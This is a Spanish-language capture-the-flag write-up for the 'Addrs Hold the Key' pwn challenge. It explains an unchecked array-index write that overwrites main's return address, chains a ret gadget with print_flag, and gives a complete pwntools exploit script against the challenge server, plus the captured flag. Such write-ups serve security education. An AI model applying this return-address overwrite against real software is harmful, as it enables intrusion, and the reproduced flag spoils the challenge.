# Addrs Hold the Key

| Campo       | Valor                          |
|-------------|--------------------------------|
| Plataforma  | KashiCTF 2026                  |
| Categoría   | pwn                            |
| Dificultad  | Easy                           |
| Puntos      | 184                            |
| Autor       | MarshmalloQi                   |

## Descripcion
> Do you even know what ret is?

## TL;DR
Out-of-bounds array write via `scanf("%d")` sin bounds check. Overwrite return address con `print_flag` usando index 14 (offset `0x38/4`). Ret gadget para stack alignment.

## Analisis inicial

```
$ file vuln
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ checksec vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No canary, no PIE → ret2win viable.

### Funciones

```
0x4011c9 <print_flag>  — abre flag.txt y la imprime
0x401238 <main>        — lee array con indices arbitrarios
```

## Vulnerabilidad identificada

**CWE-787: Out-of-bounds Write** — `main` permite escribir enteros de 4 bytes en posiciones arbitrarias del stack sin validar el indice.

### Decompilado de main (pseudocodigo)

```c
void main() {
    int count;          // rbp-0x38
    int index;          // rbp-0x34
    int array[10];      // rbp-0x30 (40 bytes)
    int i;              // rbp-0x04

    scanf("%d", &count);
    for (i = 0; i < count; i++) {
        puts("Index:");
        scanf("%d", &index);
        puts("Value:");
        scanf("%d", &array[index]);  // ← NO BOUNDS CHECK
    }
}
```

El programa dice "Indices allowed btw. 0 to 9" pero **no lo enforcea**. `array[index]` accede a `rbp - 0x30 + index * 4`.

## Proceso de resolucion

### Paso 1: Calcular offset al return address

```
Stack layout:
rbp - 0x38: count
rbp - 0x34: index
rbp - 0x30: array[0]    ← base
rbp - 0x2c: array[1]
...
rbp - 0x08: array[10]
rbp - 0x04: i (loop counter)
rbp + 0x00: saved RBP
rbp + 0x08: return address  ← target
```

Offset desde array base hasta return address:
```
(rbp + 0x08) - (rbp - 0x30) = 0x38 = 56 bytes = 14 ints
```

**index 14** escribe los 4 bytes bajos del return address.
**index 15** escribe los 4 bytes altos.

### Paso 2: Stack alignment

En x86-64, `call` necesita RSP alineado a 16 bytes. Cuando `main` hace `leave; ret`, RSP queda desalineado para `print_flag`. Solucion: insertar un `ret` gadget extra antes.

```
ret gadget: 0x40130e (ret al final de main)
```

### Paso 3: Escribir la cadena ROP

4 escrituras de 4 bytes cada una:

| Index | Direccion stack | Valor | Descripcion |
|-------|----------------|-------|-------------|
| 14 | rbp+0x08 (ret low) | 4199182 (`0x40130e`) | ret gadget |
| 15 | rbp+0x0c (ret high) | 0 | upper bytes |
| 16 | rbp+0x10 (next low) | 4198857 (`0x4011c9`) | print_flag |
| 17 | rbp+0x14 (next high) | 0 | upper bytes |

Flujo: `main` retorna → `ret` (alinea stack) → `print_flag` → lee y muestra flag.

## Exploit final

```python
from pwn import *

p = remote('34.126.223.46', 18435)
p.sendline(b'4')                        # 4 writes
p.sendline(b'14')                       # index: ret addr low
p.sendline(str(0x40130e).encode())      # ret gadget
p.sendline(b'15')                       # index: ret addr high
p.sendline(b'0')
p.sendline(b'16')                       # index: next stack slot low
p.sendline(str(0x4011c9).encode())      # print_flag
p.sendline(b'17')                       # index: next stack slot high
p.sendline(b'0')
print(p.recvall(timeout=5).decode())
```

## Ejecucion

```
$ python3 solve.py
How many times you want to change the array
Indices allowed btw. 0 to 9
Index: Value: ...
Bye lmao nothing happened
kashiCTF{made_u_return_lol_itr6l2ifYL}}
```

## Flag
```
kashiCTF{made_u_return_lol_itr6l2ifYL}}
```

## Key Lessons
- "Indices allowed 0-9" es un mensaje, no un check — siempre verificar si hay bounds check real en el assembly
- Escrituras de 4 bytes (`%d` + `scanf`) en posiciones arbitrarias del stack = control total de return address
- En x86-64 sin PIE, las direcciones del binario caben en 32 bits → una sola escritura `%d` basta para la parte baja
- Ret gadget necesario para alinear stack a 16 bytes antes de llamar funciones de libc (`fopen`, etc.)
